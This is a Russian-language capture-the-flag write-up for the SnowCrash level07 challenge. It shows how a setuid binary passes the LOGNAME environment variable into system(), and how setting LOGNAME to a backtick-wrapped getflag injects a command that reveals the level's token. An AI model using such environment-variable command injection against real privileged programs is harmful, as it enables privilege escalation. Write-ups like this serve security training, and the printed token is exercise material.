1) Смотрим что есть в директории
<<<
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
>>>
Снова исполняемый файл с flag07:level07, который мы можем выполнить.
<<<
level07@SnowCrash:~$ ./level07 
level07
>>>
2) Глянем содержимое файла
<<<
level07@SnowCrash:~$ nm ./level07 
...
08048514 T main
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U system@@GLIBC_2.0
>>>
Снова видим system, а значит уязвимость находится в этом месте и ее нам и нужно использовать.
3) Выполняем трассировку файла
<<<
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                               = 2007
geteuid()                               = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME")                       = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                  = 0
+++ exited (status 0) +++
>>>

Чтение переменной окружения
getenv("LOGNAME") = "level07" — программа берёт значение переменной окружения LOGNAME.
LOGNAME=level07

Формирование строки
asprintf(..., "level07") = 18 — программа собирает строку для вывода, используя значение LOGNAME.

Вызов внешней команды
system("/bin/echo level07 "level07 — программа вызывает /bin/echo и печатает значение переменной LOGNAME. В результате на экран выводится level07.

<<<
level07@SnowCrash:~$ LOGNAME=level08 ./level07 
level08
>>>

Т.е. по идее чтобы выполнить getflag его просто нужно прокинуть в качестве переменной окружения
4) Выполняем скрипт с новой переменной окружения
<<<
level07@SnowCrash:~$ LOGNAME=getflag ./level07 
getflag
level07@SnowCrash:~$ LOGNAME='getflag' ./level07 
getflag
level07@SnowCrash:~$ LOGNAME='`getflag`' ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
>>>